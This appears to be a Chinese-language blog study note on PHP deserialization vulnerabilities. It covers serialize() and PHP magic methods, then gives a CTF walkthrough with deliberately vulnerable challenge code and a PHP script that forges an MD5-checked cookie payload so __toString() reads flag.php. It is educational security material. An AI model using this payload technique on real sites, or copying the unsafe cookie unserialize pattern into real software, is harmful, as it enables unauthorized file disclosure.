---
title: Serialization-PHP
categories:
- Network_Security
- Web
- Serialization
- Principle
- PHP
tags:
- Network_Security
date: 2024-01-23 15:52:53
---

# 序列化漏洞

## 1. 序列化介绍

1. 序列化就是将对象状态转换为可保持或者可传输的格式（例如 Json）的过程。其逆过程就是反序列化，即将流数据转换成对象。

## 2. PHP 序列化

### 1. 序列化的函数：

1. 在 PHP 中，使用 `serialize()` 方法来序列化一个变量。

### 2. 例子

1. 假设有这样的一段代码：

    ```php
    $arr = array( 
      "0" => array( 
        "gameName" => "德乙", 
        "homeName" => "比勒费尔德", 
        "guestName" => "不伦瑞克", 
        "endTime" => "2015-08-21" 
      ), 
      "1" => array( 
        "gameName" => "英超", 
        "homeName" => "水晶宫", 
        "guestName" => "阿斯顿维拉", 
        "endTime" => "2015-08-22" 
      ) 
    ); 
    
    $serialize = serialize($arr); 
    echo $serialize; 
    ```

    然后其序列化的结果为：

    ```php
    a:2:{i:0;a:4:{s:8:"gameName";s:6:"德乙";s:8:"homeName";s:15:"比勒费尔德";s:9:"guestName";s:12:"不伦瑞克";s:7:"endTime";s:10:"2015-08-21";}i:1;a:4:{s:8:"gameName";s:6:"英超";s:8:"homeName";s:9:"水晶宫";s:9:"guestName";s:15:"阿斯顿维拉";s:7:"endTime";s:10:"2015-08-22";}} 
    ```

    将其放在 PHP 在线反序列化的网站中反序列化，得到：

    ### ![image-20220607194428014](image-20220607194428014.png)

### 3. PHP 常见的 magic 方法：

| 方法名                                        | 触发点                                                       |
| --------------------------------------------- | ------------------------------------------------------------ |
| `__construct`                                 | 在创建对象时初始化对象（类似于构造函数），用于变量的初始化   |
| `__destruct`                                  | 对象销毁时调用，即用户销毁或者内核自动销毁时调用（有点像析构函数） |
| `__get`                                       | 用于从不可访问的属性读取数据，即在调用私有属性的时候会自动执行 |
| `__set`                                       | 用于将数据写入不可访问的属性                                 |
| `__isset`                                     | 在不可访问的属性上调用 `isset()` 或 `empty()` 触发           |
| `__unset`                                     | 和 `__isset` 类似                                            |
| `__call`                                      | 在对象上下文中调用不可访问或者不存在的方法时触发，即当调用对象中不存在的方法会自动调用该方法 |
| `__callStatic`                                | 在对象上下文中调用不可访问或者不存在的静态方法时触发，即当调用对象中不存在的方法会自动调用该方法 |
| `__sleep`                                     | 在调用 `serialize()` 时先被调用，其一般的作用是清理对象或者提交未提交的数据，并返回一个包含 对象中所有应该被序列化的变量名称的 数组（就是可以指定被序列化的内容）。如果未返回任何内容，那么 `null` 就会被序列化，并产生错误。 |
| `__wakeup`                                    | 在调用 `unserialize()` 时先被调用，返回空值，通常用于执行重新链接数据库或者其他初始化操作。 |
| `__serialize`<br/>适用于 PHP 7.4.0 以上版本   | 优先级高于 `__sleep()` 且会替代其执行，如果对象继承实现了 `Serializable` 接口，那么该对象的 `serialize()` 将会被 `__serialize`() 替代。 |
| `__unserialize`<br/>适用于 PHP 7.4.0 以上版本 | 和 `__serialize()` 差不多，同样会替代 `__wakeup()`           |
| `__toString`                                  | 和 Java 的 `toString()` 类似                                 |
| `__clone`                                     | 当对象被复制时调用                                           |
| ...还有其他方法，用到后就补充                 |                                                              |

### 4. 反序列化例题：`__toString()` 的反序列化

1. `__toString()`，和 Java 的 `toString()` 很类似，当一个类被当作字符串使用的时候（例如打印出来），就会自动调用该方法。

2. 题目源代码如下：

    ```php+HTML
    <?php
    // 创建一个类
    Class readme{
        public function __toString()
        {
            // __toString() 的结果是将变量 source 指代的文件在网页中格式化显示。
            return highlight_file('Readme.txt', true).highlight_file($this->source, true);
        }
    }
    // 用 GET 给 source 随便传值就可以获得源代码 
    if(isset($_GET['source'])){
        $s = new readme();
        $s->source = __FILE__;
        echo $s;
        exit;
    }
    // $todos = [];
    if(isset($_COOKIE['todos'])){
        $c = $_COOKIE['todos'];
        // 变量 h 获取 cookie 的前 32 位
        $h = substr($c, 0, 32);
        // 变量 m 获取 cookie 的 32 位向后的字符串
        $m = substr($c, 32);
        // 如果 m 的 md5 hash 值和 h 相等，则反序列化变量 m 的内容
        if(md5($m) === $h){
            $todos = unserialize($m);
        }
    }
    // 感觉这里可以应用，因为他序列化并且加密了（待学习补充）
    if(isset($_POST['text'])){
        $todo = $_POST['text'];
        $todos[] = $todo;
        $m = serialize($todos);
        $h = md5($m);
        setcookie('todos', $h.$m);
        header('Location: '.$_SERVER['REQUEST_URI']);
        exit;
    }
    ?>
    <html>
    <head>
    </head>
    
    <h1>Readme</h1>
    <a href="?source"><h2>Check Code</h2></a>
    <ul>
        <!-- 这里将变量 todos 进行一个遍历（从 $todos[] = $todo;）以及其需要遍历来看，其本身应该是一个数组，那么需要传入一个数组 -->
        <?php foreach($todos as $todo):?>
            <li><?=$todo?></li>
        <?php endforeach;?>
    </ul>
    
    <form method="post" href=".">
        <textarea name="text"></textarea>
        <input type="submit" value="store">
    </form>
    ```

3. 因此构造脚本，生成序列化的结果和 md5 加密后的字符串

    ```php
    <?php
    // 类不变，直接拿过来
    Class readme{
        public function __toString()
        {
            return highlight_file('Readme.txt', true).highlight_file($this->source, true);
        }
    }
    if(isset($_GET['source'])){
        $s = new readme();
        // 这里如果直接改成 flag.php，那么就可以直接读取到源码
        $s->source = 'flag.php';
        // 将变量 s 变成数组，因为它到时要被反序列化赋值给变量 todos
        $s=[$s];
        // 打印序列化的内容和序列化加密后的内容
        echo serialize($s);
        echo md5(serialize($s));
        echo $s;
        exit;
    }
    ```

4. 转换后的结果如下：

    ![image-20220617162348376](image-20220617162348376.png)

5. 在 burpsuite 中设置 cookie 值（url 编码），让其反序列化并在 html 代码中遍历打印（打印类时就会调用 `__toString()`），从而将 `flag.php` 显示出来。

    ![image-20220617162642514](image-20220617162642514.png)

6. 待学习补充：text 的作用。



